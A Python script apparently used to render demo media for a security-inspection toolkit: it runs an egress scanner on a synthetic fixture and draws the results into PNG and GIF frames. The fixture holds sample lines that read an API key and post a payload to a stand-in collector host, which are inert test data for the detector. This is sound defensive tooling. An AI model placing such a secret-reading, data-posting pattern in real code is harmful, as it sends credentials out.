"""Render documentation media from a real CLI run on synthetic text, never target code.

Optional authoring dependency: Pillow. Run from any working directory.
This script is not required by the toolkit, skills, or installer.
"""

import json
import subprocess
import sys
import tempfile
from pathlib import Path

from PIL import Image, ImageDraw, ImageFont

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[2]
FIXTURE = (
    'os.environ.get("SYNTHETIC_API_KEY")\n'
    'requests.post("https://collector.example.invalid", data=payload)\n'
    'subprocess.run(["echo", "synthetic"])\n'
)
BG = "#09131f"
PANEL = "#101f30"
FG = "#e6edf5"
MUTED = "#a1b3c8"
TEAL = "#63e5c4"
AMBER = "#ffc876"


def capture():
    with tempfile.TemporaryDirectory(prefix="security-skills-demo-") as directory:
        work = Path(directory)
        target = work / "synthetic-demo"
        target.mkdir()
        (target / "agent.txt").write_text(FIXTURE, encoding="utf-8", newline="\n")
        (target / ".env").write_text(
            "SYNTHETIC_ONLY=not-a-secret\n", encoding="utf-8", newline="\n"
        )
        run = subprocess.run(
            [
                sys.executable,
                str(ROOT / "scripts/security_check.py"),
                "egress",
                str(target),
                "--max-findings",
                "2",
                "--output",
                str(work / "report.json"),
            ],
            capture_output=True,
            text=True,
            encoding="utf-8",
            timeout=30,
            check=False,
        )
        if run.returncode != 3:
            raise RuntimeError(f"Expected PARTIAL / exit 3: {run.stderr}")
        compact = json.loads(run.stdout)
        full = json.loads((work / "report.json").read_text(encoding="utf-8"))
    expected = {"sensitive-source", "outbound-client", "execution-hook"}
    assert full["result"] == "PARTIAL"
    assert {item["rule"] for item in full["findings"]} == expected
    assert full["finding_count"] == 3
    assert len(compact["findings"]) == 2 and compact["omitted_findings"] == 1
    assert full["coverage"]["files_read"] == 1
    assert full["coverage"]["skipped_count"] == 1
    assert full["coverage"]["runtime_observed"] is False
    # Only the random temporary scope path is normalized for a portable example.
    for report in (compact, full):
        report["scope"] = "<synthetic-demo>"
    return compact, full


def frame(step, title, rows):
    canvas = Image.new("RGB", (1120, 650), BG)
    draw = ImageDraw.Draw(canvas)
    font = ImageFont.load_default(size=23)
    small = ImageFont.load_default(size=18)
    heading = ImageFont.load_default(size=31)
    shield = [(42, 30), (64, 38), (61, 61), (42, 75), (23, 61), (20, 38)]
    draw.polygon(shield, fill="#123b3a", outline=TEAL, width=2)
    draw.line([(33, 49), (42, 44), (51, 49), (42, 58), (33, 49)], fill=TEAL, width=2)
    draw.text((82, 33), "SECURITY AGENT SKILLS", font=heading, fill=FG)
    draw.text((82, 74), "Local inspection. Evidence before trust.", font=small, fill=MUTED)
    draw.rounded_rectangle((32, 125, 1088, 561), radius=15, fill=PANEL, outline="#294057")
    labels = ["INPUT", "SCAN", "REVIEW", "COVERAGE", "EVIDENCE"]
    for index, label in enumerate(labels):
        x = 58 + index * 204
        color = TEAL if index == step else MUTED
        draw.text((x, 147), f"0{index + 1}  {label}", font=small, fill=color)
        draw.line((x, 180, x + 172, 180), fill=color, width=3 if index == step else 1)
    draw.text((58, 205), title, font=heading, fill=FG)
    for index, (text, color) in enumerate(rows):
        draw.text((58, 270 + index * 43), text, font=font, fill=color)
    draw.text(
        (36, 590),
        "SYNTHETIC FIXTURE  |  Rendered CLI summary  |  No target code executed",
        font=small,
        fill=MUTED,
    )
    draw.text(
        (36, 618),
        "PARTIAL is incomplete evidence, never a safety certification.",
        font=small,
        fill=AMBER,
    )
    return canvas


def main():
    compact, full = capture()
    first, second = compact["findings"]
    coverage = full["coverage"]
    frames = [
        frame(
            0,
            "Review one unfamiliar agent package",
            [
                ("synthetic-demo/agent.txt     3 inert source-like lines", FG),
                ("synthetic-demo/.env          synthetic placeholder only", MUTED),
                ("No package imports. No install hooks. No network requests.", TEAL),
                ("Fixture text is inspected, never executed.", TEAL),
            ],
        ),
        frame(
            1,
            "Run the bounded local helper",
            [
                ("$ python scripts/security_check.py egress synthetic-demo", FG),
                ("    --max-findings 2 --output report.json", TEAL),
                (f"Result: {full['result']}     Exit: 3", AMBER),
                (f"Workflow: {full['workflow']}", MUTED),
            ],
        ),
        frame(
            2,
            "Find review leads, not confirmed exploits",
            [
                (f"{first['rule']}     {first['path']}:{first['line']}", TEAL),
                (f"{second['rule']}      {second['path']}:{second['line']}", TEAL),
                (
                    f"Findings: {full['finding_count']}     Visible: 2     Omitted: {compact['omitted_findings']}",
                    FG,
                ),
                ("Trace destinations, payloads, triggers, and consumers.", MUTED),
            ],
        ),
        frame(
            3,
            "Keep the limits beside the findings",
            [
                (
                    f"Files read: {coverage['files_read']}     Skipped: {coverage['skipped_count']}",
                    FG,
                ),
                (
                    f"Skipped: {coverage['skipped'][0]['path']} ({coverage['skipped'][0]['reason']})",
                    MUTED,
                ),
                ("Runtime observed: false     Atomic snapshot: false", AMBER),
                ("Missing indicators do not establish safety.", AMBER),
            ],
        ),
        frame(
            4,
            "Keep full evidence; send a compact summary",
            [
                ("Console: 2 leads + counts + coverage + limitations", TEAL),
                (
                    f"report.json: all {full['finding_count']} leads with stable IDs and file lines",
                    FG,
                ),
                ("Inspect the referenced source before reaching a conclusion.", MUTED),
                ("Runtime transfers remain unverified by this scan.", AMBER),
            ],
        ),
    ]
    for name, value in [("demo-report.json", full), ("demo-compact.json", compact)]:
        (HERE / name).write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8", newline="\n")
    (HERE / "demo-fixture.txt").write_text(FIXTURE, encoding="utf-8", newline="\n")
    frames[-1].save(HERE / "security-demo.png", optimize=True)
    frames[0].save(
        HERE / "security-demo.gif",
        save_all=True,
        append_images=frames[1:],
        duration=[2400, 2800, 3200, 3200, 4000],
        loop=0,
        optimize=True,
        disposal=2,
    )
    print(
        json.dumps(
            {
                "result": "PASS",
                "frames": len(frames),
                "finding_count": full["finding_count"],
                "cli_exit": 3,
            }
        )
    )


if __name__ == "__main__":
    main()
